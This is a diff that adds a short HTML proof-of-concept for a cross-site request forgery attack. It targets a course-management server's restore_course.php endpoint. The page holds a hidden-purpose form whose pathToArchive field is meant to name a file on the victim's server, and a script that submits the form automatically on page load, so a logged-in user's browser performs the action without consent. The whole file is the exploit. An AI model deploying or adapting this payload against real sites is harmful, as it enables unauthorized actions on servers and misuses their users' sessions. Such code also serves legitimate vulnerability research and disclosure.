@@ -1,0 +1,11 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/course_info/restore_course.php' method='post'>
+
+
+  <input type='text' name='pathToArchive' value='path_to_file_we_want_to_open_in_HIS_server'/>
+  <input class='FormData_InputText' type='text' name='send_path' value='submit'>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
